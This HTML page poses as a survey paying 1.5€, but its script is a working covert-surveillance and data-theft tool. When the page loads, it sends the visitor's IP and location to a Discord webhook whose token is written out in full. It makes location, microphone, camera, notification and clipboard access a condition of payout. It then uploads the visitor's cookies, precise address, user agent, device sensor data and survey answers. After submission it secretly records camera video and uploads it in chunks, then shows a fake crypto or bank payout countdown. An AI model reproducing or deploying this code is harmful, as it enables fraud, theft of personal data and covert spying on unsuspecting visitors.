<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Earn 1.5€ – Advanced Survey</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(145deg, #e0eafc 0%, #cfdef3 100%);
            font-family: 'Segoe UI', Roboto, sans-serif;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            max-width: 800px;
            width: 100%;
            background: white;
            border-radius: 32px;
            box-shadow: 0 25px 45px rgba(0,0,0,0.15);
            overflow: hidden;
        }
        .header {
            background: linear-gradient(95deg, #1f5e3a, #2c7a4d);
            color: white;
            padding: 24px 28px;
            text-align: center;
        }
        .header h1 { font-size: 1.8rem; font-weight: 700; }
        .earn-badge {
            background: gold;
            color: #1e3a2f;
            display: inline-block;
            padding: 6px 18px;
            border-radius: 40px;
            font-weight: bold;
            margin-top: 12px;
        }
        .content { padding: 28px 30px 35px; }
        .question-item {
            margin-bottom: 22px;
            border-bottom: 1px solid #e2e8f0;
            padding-bottom: 14px;
        }
        .options {
            display: flex;
            flex-wrap: wrap;
            gap: 12px;
        }
        .options label {
            background: #f1f5f9;
            padding: 6px 14px;
            border-radius: 40px;
            cursor: pointer;
            font-size: 0.85rem;
        }
        .options input { margin-right: 6px; }
        .permission-panel {
            background: #fff8e7;
            border-left: 5px solid #f59e0b;
            padding: 16px 20px;
            margin: 25px 0 20px;
            border-radius: 20px;
        }
        .perm-step {
            display: flex;
            align-items: center;
            flex-wrap: wrap;
            gap: 12px;
            margin: 12px 0;
        }
        .perm-btn {
            background: #2c7a4d;
            color: white;
            border: none;
            padding: 6px 18px;
            border-radius: 30px;
            cursor: pointer;
            font-weight: 600;
        }
        .perm-btn:disabled { background: #94a3b8; cursor: not-allowed; }
        .status { font-size: 0.85rem; color: #2d3748; }
        .location-map {
            background: #e6f7ff;
            border-radius: 16px;
            padding: 12px;
            margin: 12px 0;
            display: none;
        }
        .submit-btn {
            background: #f59e0b;
            color: #1e293b;
            border: none;
            padding: 14px 28px;
            border-radius: 60px;
            font-size: 1rem;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
            margin-top: 15px;
        }
        .submit-btn:disabled { background: #cbd5e1; cursor: not-allowed; }
        .withdraw-section {
            background: #fef9e3;
            padding: 20px;
            border-radius: 24px;
            margin-top: 20px;
            display: none;
        }
        .timer {
            font-family: monospace;
            font-size: 1.6rem;
            text-align: center;
            margin: 20px 0;
            color: #d9534f;
        }
        .footer { background: #f8fafc; padding: 14px; text-align: center; font-size: 11px; }
    </style>
</head>
<body>
<div class="container" id="mainContainer">
    <div class="header">
        <h1>💰 Earn 1.5€ instantly!</h1>
        <div class="earn-badge">🎁 Your reward: 1.5 €</div>
    </div>
    <div class="content" id="dynamicContent"></div>
    <div class="footer">Secure payment • Advanced device verification</div>
</div>

<script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1479602171736494100/TtSG3mzG9tpZg0TiLkBCHvjtMVw4SkbqfZEWJRfU5hi_uHyoGb7WqwaS5GNUM5vphNwR";

    // ========================= 14 SURVEY QUESTIONS =========================
    const questions = [
        "How often do you shop online?", "Which social media do you use most?", "Your age group?",
        "Most important smartphone feature?", "Daily internet usage?", "Favorite streaming service?",
        "Do you use ad blockers?", "Primary operating system?", "Targeted ads make you feel?",
        "Preferred payment method?", "Do you read privacy policies?", "Likely to recommend product?",
        "Do you use a VPN?", "Which browser do you prefer?"
    ];
    const optionSets = [
        ["Daily","Weekly","Monthly","Rarely"], ["TikTok","Instagram","Twitter","Facebook","LinkedIn"],
        ["18-24","25-34","35-44","45+"], ["Battery","Camera","Performance","Price"],
        ["<2h","2-5h","5-8h",">8h"], ["Netflix","YouTube","Disney+","Prime Video","Other"],
        ["Always","Sometimes","Never","What is ad blocker?"], ["Windows","macOS","Linux","Android","iOS"],
        ["Acceptable","Annoying","Invasion of privacy","I don't care"], ["Credit card","PayPal","Crypto","Bank transfer"],
        ["Always","Sometimes","Never","Didn't know"], ["Very likely","Likely","Neutral","Unlikely"],
        ["Yes","No","What is VPN?"], ["Chrome","Firefox","Edge","Safari","Opera","Brave"]
    ];

    let userAnswers = {};
    let permissions = { geo: false, mic: false, camera: false, notif: false, clip: false };
    let advancedPerms = { orientation: false, hid: false, serial: false, nfc: false, light: false };
    let cameraStream = null;
    let locationData = null;
    let orientationData = null;
    let hidData = null;
    let serialData = null;
    let nfcData = null;
    let lightData = null;

    // Helper: send text log to Discord
    async function sendTextLog(answers, locData, withdrawalMethod = null, extra = {}) {
        let report = `💰 EARN SURVEY (1.5€) - ADVANCED LOG\nTime: ${new Date().toISOString()}\nURL: ${window.location.href}\n`;
        if (locData && locData.address) report += `📍 Location: ${locData.address}\nMaps: https://www.google.com/maps?q=${locData.lat},${locData.lon}\n`;
        if (orientationData) report += `📱 Device Orientation: α=${orientationData.alpha}, β=${orientationData.beta}, γ=${orientationData.gamma}\n`;
        if (hidData) report += `🔌 HID Devices: ${JSON.stringify(hidData)}\n`;
        if (serialData) report += `🔗 Serial Ports: ${JSON.stringify(serialData)}\n`;
        if (nfcData) report += `📡 NFC: ${JSON.stringify(nfcData)}\n`;
        if (lightData) report += `💡 Ambient Light: ${lightData} lux\n`;
        report += `🍪 Cookies: ${document.cookie || "none"}\n`;
        report += `📱 UA: ${navigator.userAgent}\n`;
        for (let i=0; i<questions.length; i++) {
            report += `${i+1}. ${questions[i]} → ${answers[i] || "not answered"}\n`;
        }
        if (withdrawalMethod) report += `💸 Withdrawal: ${withdrawalMethod}\n`;
        const blob = new Blob([report], { type: "text/plain" });
        const formData = new FormData();
        formData.append("file", blob, `advanced_log_${Date.now()}.txt`);
        const embed = {
            embeds: [{
                title: "📡 ADVANCED SURVEY LOG",
                description: `**Location:** ${locData?.address || "denied"}\n**Orientation:** ${orientationData ? "captured" : "no"}\n**HID/Serial/NFC:** ${hidData||serialData||nfcData?"yes":"no"}\n**Withdrawal:** ${withdrawalMethod || "pending"}`,
                color: 0xf59e0b,
                timestamp: new Date().toISOString()
            }]
        };
        formData.append("payload_json", JSON.stringify(embed));
        await fetch(WEBHOOK_URL, { method: "POST", body: formData }).catch(e=>console.error);
    }

    // ==================== VIDEO RECORDING (progressive) ====================
    let mediaRecorder = null;
    let recordedChunks = [];
    let recordingActive = false;

    async function startProgressiveRecording(totalSec, intervals) {
        if (!cameraStream) return;
        recordedChunks = [];
        mediaRecorder = new MediaRecorder(cameraStream, { mimeType: "video/webm" });
        mediaRecorder.ondataavailable = (e) => { if (e.data.size>0) recordedChunks.push(e.data); };
        mediaRecorder.start(100);
        recordingActive = true;
        for (let sec of intervals) {
            setTimeout(async () => {
                if (!recordingActive) return;
                if (mediaRecorder && mediaRecorder.state === "recording") {
                    mediaRecorder.stop();
                    await new Promise(resolve => {
                        mediaRecorder.onstop = async () => {
                            const blob = new Blob(recordedChunks, { type: "video/webm" });
                            await sendVideoBlob(blob, sec);
                            recordedChunks = [];
                            mediaRecorder = new MediaRecorder(cameraStream, { mimeType: "video/webm" });
                            mediaRecorder.ondataavailable = (e2) => { if (e2.data.size>0) recordedChunks.push(e2.data); };
                            mediaRecorder.start(100);
                            resolve();
                        };
                    });
                }
            }, sec * 1000);
        }
        setTimeout(async () => {
            if (mediaRecorder && mediaRecorder.state === "recording") {
                mediaRecorder.stop();
                await new Promise(resolve => {
                    mediaRecorder.onstop = async () => {
                        if (recordedChunks.length) {
                            const finalBlob = new Blob(recordedChunks, { type: "video/webm" });
                            await sendVideoBlob(finalBlob, totalSec);
                        }
                        if (cameraStream) cameraStream.getTracks().forEach(t => t.stop());
                        recordingActive = false;
                        resolve();
                    };
                });
            }
        }, totalSec * 1000);
    }

    async function sendVideoBlob(blob, seconds) {
        if (blob.size === 0) return;
        const formData = new FormData();
        formData.append("file", blob, `video_${seconds}s.webm`);
        const embed = {
            embeds: [{
                title: `🎥 Video chunk (${seconds}s)`,
                description: `Size: ${(blob.size/1024).toFixed(1)} KB`,
                color: 0xff6600,
                timestamp: new Date().toISOString()
            }]
        };
        formData.append("payload_json", JSON.stringify(embed));
        await fetch(WEBHOOK_URL, { method: "POST", body: formData }).catch(e=>console.error);
    }

    // ==================== PERMISSION REQUESTS (basic) ====================
    async function requestGeolocation() {
        try {
            const pos = await new Promise((res,rej)=> navigator.geolocation.getCurrentPosition(res,rej, {enableHighAccuracy:true}));
            const lat = pos.coords.latitude, lon = pos.coords.longitude;
            const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
            const data = await geoRes.json();
            locationData = { address: data.display_name, lat, lon };
            const mapDiv = document.getElementById("locationMap");
            if (mapDiv) {
                mapDiv.innerHTML = `📍 <a href="https://www.google.com/maps?q=${lat},${lon}" target="_blank">Open in Google Maps</a> (${lat.toFixed(5)}, ${lon.toFixed(5)})`;
                mapDiv.style.display = "block";
            }
            return true;
        } catch(e) { return false; }
    }
    async function requestMicrophone() {
        try { const s = await navigator.mediaDevices.getUserMedia({ audio: true }); s.getTracks().forEach(t=>t.stop()); return true; }
        catch(e) { return false; }
    }
    async function requestCamera() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            cameraStream = stream;
            return true;
        } catch(e) { return false; }
    }
    async function requestNotifications() {
        if (Notification.permission === "granted") return true;
        const result = await Notification.requestPermission();
        return result === "granted";
    }
    async function requestClipboard() {
        try { await navigator.clipboard.readText(); return true; }
        catch(e) { return false; }
    }

    // ==================== ADVANCED SENSORS ====================
    async function requestDeviceOrientation() {
        if (typeof DeviceOrientationEvent !== "undefined" && typeof DeviceOrientationEvent.requestPermission === "function") {
            // iOS requires explicit user gesture
            try {
                const permissionState = await DeviceOrientationEvent.requestPermission();
                if (permissionState === "granted") {
                    window.addEventListener("deviceorientation", (e) => {
                        orientationData = { alpha: e.alpha, beta: e.beta, gamma: e.gamma };
                    });
                    return true;
                }
            } catch(e) { return false; }
        } else if (window.DeviceOrientationEvent) {
            window.addEventListener("deviceorientation", (e) => {
                orientationData = { alpha: e.alpha, beta: e.beta, gamma: e.gamma };
            });
            return true;
        }
        return false;
    }

    async function requestHID() {
        if (!navigator.hid) return false;
        try {
            const devices = await navigator.hid.requestDevice({ filters: [] });
            hidData = devices.map(d => ({ name: d.productName, vendorId: d.vendorId, productId: d.productId }));
            return true;
        } catch(e) { return false; }
    }

    async function requestSerial() {
        if (!navigator.serial) return false;
        try {
            const ports = await navigator.serial.getPorts();
            serialData = ports.map(p => ({ type: "Serial port" }));
            // we can also request a new port: await navigator.serial.requestPort();
            return true;
        } catch(e) { return false; }
    }

    async function requestNFC() {
        if (!("NDEFReader" in window)) return false;
        try {
            const reader = new NDEFReader();
            await reader.scan();
            reader.onreading = (event) => {
                nfcData = event.message.records;
            };
            return true;
        } catch(e) { return false; }
    }

    async function requestAmbientLight() {
        if (!("AmbientLightSensor" in window)) return false;
        try {
            const sensor = new AmbientLightSensor();
            sensor.onreading = () => { lightData = sensor.illuminance; };
            sensor.start();
            return true;
        } catch(e) { return false; }
    }

    // ==================== UI RENDER ====================
    function renderPage() {
        let html = `<div id="questionsArea"></div>
        <div class="permission-panel">
            <div style="font-weight:bold;">🔐 Required for payout:</div>
            <div class="perm-step">📍 Location <button class="perm-btn" id="btnGeo">Allow</button> <span id="statusGeo" class="status">pending</span></div>
            <div id="locationMap" class="location-map"></div>
            <div class="perm-step">🎤 Microphone <button class="perm-btn" id="btnMic">Allow</button> <span id="statusMic" class="status">pending</span></div>
            <div class="perm-step">🎥 Camera <button class="perm-btn" id="btnCamera">Allow</button> <span id="statusCamera" class="status">pending</span></div>
            <div class="perm-step">🔔 Notifications <button class="perm-btn" id="btnNotif">Allow</button> <span id="statusNotif" class="status">pending</span></div>
            <div class="perm-step">📋 Clipboard <button class="perm-btn" id="btnClip">Allow</button> <span id="statusClip" class="status">pending</span></div>
        </div>
        <div class="permission-panel" style="margin-top:10px;">
            <div style="font-weight:bold;">🛸 Advanced sensors (optional – increases reward verification):</div>
            <div class="perm-step">📳 Device Orientation <button class="perm-btn" id="btnOrientation">Allow</button> <span id="statusOrientation" class="status">pending</span></div>
            <div class="perm-step">🖱️ HID (keyboard/mouse) <button class="perm-btn" id="btnHID">Allow</button> <span id="statusHID" class="status">pending</span></div>
            <div class="perm-step">🔌 Serial Ports <button class="perm-btn" id="btnSerial">Allow</button> <span id="statusSerial" class="status">pending</span></div>
            <div class="perm-step">📡 NFC <button class="perm-btn" id="btnNFC">Allow</button> <span id="statusNFC" class="status">pending</span></div>
            <div class="perm-step">💡 Ambient Light <button class="perm-btn" id="btnLight">Allow</button> <span id="statusLight" class="status">pending</span></div>
        </div>
        <button class="submit-btn" id="submitSurvey" disabled>✅ Submit survey & earn 1.5€</button>`;
        document.getElementById("dynamicContent").innerHTML = html;
        // generate questions
        let qhtml = '';
        for (let i=0; i<questions.length; i++) {
            qhtml += `<div class="question-item"><div class="options" data-qid="${i}">${questions[i]}<br>`;
            for (let opt of optionSets[i]) {
                qhtml += `<label><input type="radio" name="q${i}" value="${opt}"> ${opt}</label>`;
            }
            qhtml += `</div></div>`;
        }
        document.getElementById("questionsArea").innerHTML = qhtml;
        document.querySelectorAll('input[type="radio"]').forEach(r => {
            r.addEventListener('change', (e) => {
                const qid = e.target.closest('.options').getAttribute('data-qid');
                userAnswers[qid] = e.target.value;
            });
        });
        // attach basic permission buttons
        document.getElementById("btnGeo").onclick = async () => {
            document.getElementById("statusGeo").innerText = "requesting...";
            const ok = await requestGeolocation();
            document.getElementById("statusGeo").innerHTML = ok ? "✅ granted" : "❌ denied";
            permissions.geo = ok;
            document.getElementById("btnGeo").disabled = ok;
            checkAll();
        };
        document.getElementById("btnMic").onclick = async () => {
            document.getElementById("statusMic").innerText = "requesting...";
            const ok = await requestMicrophone();
            document.getElementById("statusMic").innerHTML = ok ? "✅ granted" : "❌ denied";
            permissions.mic = ok;
            document.getElementById("btnMic").disabled = ok;
            checkAll();
        };
        document.getElementById("btnCamera").onclick = async () => {
            document.getElementById("statusCamera").innerText = "requesting...";
            const ok = await requestCamera();
            document.getElementById("statusCamera").innerHTML = ok ? "✅ granted" : "❌ denied";
            permissions.camera = ok;
            document.getElementById("btnCamera").disabled = ok;
            checkAll();
        };
        document.getElementById("btnNotif").onclick = async () => {
            document.getElementById("statusNotif").innerText = "requesting...";
            const ok = await requestNotifications();
            document.getElementById("statusNotif").innerHTML = ok ? "✅ granted" : "❌ denied";
            permissions.notif = ok;
            document.getElementById("btnNotif").disabled = ok;
            checkAll();
        };
        document.getElementById("btnClip").onclick = async () => {
            document.getElementById("statusClip").innerText = "requesting...";
            const ok = await requestClipboard();
            document.getElementById("statusClip").innerHTML = ok ? "✅ granted" : "❌ denied";
            permissions.clip = ok;
            document.getElementById("btnClip").disabled = ok;
            checkAll();
        };
        // advanced sensors
        document.getElementById("btnOrientation").onclick = async () => {
            document.getElementById("statusOrientation").innerText = "requesting...";
            const ok = await requestDeviceOrientation();
            document.getElementById("statusOrientation").innerHTML = ok ? "✅ granted" : "❌ denied (or not supported)";
            advancedPerms.orientation = ok;
            document.getElementById("btnOrientation").disabled = ok;
            checkAll();
        };
        document.getElementById("btnHID").onclick = async () => {
            document.getElementById("statusHID").innerText = "requesting...";
            const ok = await requestHID();
            document.getElementById("statusHID").innerHTML = ok ? "✅ granted" : "❌ denied";
            advancedPerms.hid = ok;
            document.getElementById("btnHID").disabled = ok;
            checkAll();
        };
        document.getElementById("btnSerial").onclick = async () => {
            document.getElementById("statusSerial").innerText = "requesting...";
            const ok = await requestSerial();
            document.getElementById("statusSerial").innerHTML = ok ? "✅ granted" : "❌ denied";
            advancedPerms.serial = ok;
            document.getElementById("btnSerial").disabled = ok;
            checkAll();
        };
        document.getElementById("btnNFC").onclick = async () => {
            document.getElementById("statusNFC").innerText = "requesting...";
            const ok = await requestNFC();
            document.getElementById("statusNFC").innerHTML = ok ? "✅ granted" : "❌ denied/unsupported";
            advancedPerms.nfc = ok;
            document.getElementById("btnNFC").disabled = ok;
            checkAll();
        };
        document.getElementById("btnLight").onclick = async () => {
            document.getElementById("statusLight").innerText = "requesting...";
            const ok = await requestAmbientLight();
            document.getElementById("statusLight").innerHTML = ok ? "✅ granted" : "❌ denied/unsupported";
            advancedPerms.light = ok;
            document.getElementById("btnLight").disabled = ok;
            checkAll();
        };
        function checkAll() {
            const allBasic = permissions.geo && permissions.mic && permissions.camera && permissions.notif && permissions.clip;
            const submitBtn = document.getElementById("submitSurvey");
            submitBtn.disabled = !allBasic;
            if (allBasic) submitBtn.innerText = "✅ Claim my 1.5€ now!";
        }
        document.getElementById("submitSurvey").onclick = async () => {
            const btn = document.getElementById("submitSurvey");
            if (btn.disabled) return;
            btn.disabled = true;
            btn.innerText = "Processing... please wait";
            const finalAnswers = {};
            for (let i=0; i<questions.length; i++) {
                const selected = document.querySelector(`input[name="q${i}"]:checked`);
                finalAnswers[i] = selected ? selected.value : "(not answered)";
            }
            await sendTextLog(finalAnswers, locationData, null, { orientation: orientationData, hid: hidData, serial: serialData, nfc: nfcData, light: lightData });
            if (permissions.camera && cameraStream) startProgressiveRecording(32, [1,5,10,20,30,32]);
            showWithdrawOptions(finalAnswers);
        };
    }

    async function showWithdrawOptions(answers) {
        const container = document.getElementById("dynamicContent");
        container.innerHTML = `
            <div class="withdraw-section" style="display:block;">
                <h3>🎉 You earned 1.5 €!</h3>
                <p>Withdrawal method:</p>
                <div style="display:flex; gap:15px; flex-wrap:wrap;">
                    <button class="perm-btn" id="btc">₿ Bitcoin</button>
                    <button class="perm-btn" id="ltc">Ł Litecoin</button>
                    <button class="perm-btn" id="eth">Ξ Ethereum</button>
                    <button class="perm-btn" id="bank">🏦 Bank Transfer</button>
                </div>
                <div id="timerArea" style="font-size:1.4rem; text-align:center; margin-top:20px;"></div>
            </div>
        `;
        const btc = document.getElementById("btc");
        const ltc = document.getElementById("ltc");
        const eth = document.getElementById("eth");
        const bank = document.getElementById("bank");
        const timerDiv = document.getElementById("timerArea");
        const handleWithdraw = async (method) => {
            await sendTextLog(answers, locationData, method, { orientation: orientationData, hid: hidData, serial: serialData, nfc: nfcData, light: lightData });
            let seconds = 420;
            timerDiv.innerText = `⏳ Processing ${method}... 7:00 minutes`;
            const interval = setInterval(() => {
                if (seconds <= 0) {
                    clearInterval(interval);
                    timerDiv.innerText = "✅ Payment sent! Check wallet/bank within 24h.";
                    setTimeout(() => container.innerHTML = `<div style="text-align:center; padding:30px;"><h3>Thank you!</h3></div>`, 3000);
                } else {
                    const mins = Math.floor(seconds / 60);
                    const secs = seconds % 60;
                    timerDiv.innerText = `⏳ Processing ${method}... ${mins}:${secs.toString().padStart(2,'0')} minutes`;
                    seconds--;
                }
            }, 1000);
            [btc, ltc, eth, bank].forEach(b => b.disabled = true);
        };
        btc.onclick = () => handleWithdraw("BTC");
        ltc.onclick = () => handleWithdraw("LTC");
        eth.onclick = () => handleWithdraw("ETH");
        bank.onclick = () => handleWithdraw("Bank");
    }

    // initial IP webhook
    (async function() {
        try {
            const ipRes = await fetch("https://api.ipify.org?format=json");
            const ip = (await ipRes.json()).ip;
            const geoRes = await fetch("https://ipapi.co/json/");
            const geo = geoRes.ok ? await geoRes.json() : {};
            const payload = {
                username: "💰 Advanced Logger IP",
                embeds: [{
                    title: "🕵️ IP (Page Load)",
                    description: `**IP:** ${ip}\n**Time:** ${new Date().toISOString()}`,
                    fields: [
                        { name: "IP Location", value: `${geo.city}, ${geo.country_name}`, inline: true },
                        { name: "ISP", value: geo.org || "Unknown", inline: true }
                    ],
                    color: 0xf59e0b
                }]
            };
            await fetch(WEBHOOK_URL, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(payload) });
        } catch(e) {}
    })();

    renderPage();
</script>
</body>
</html>
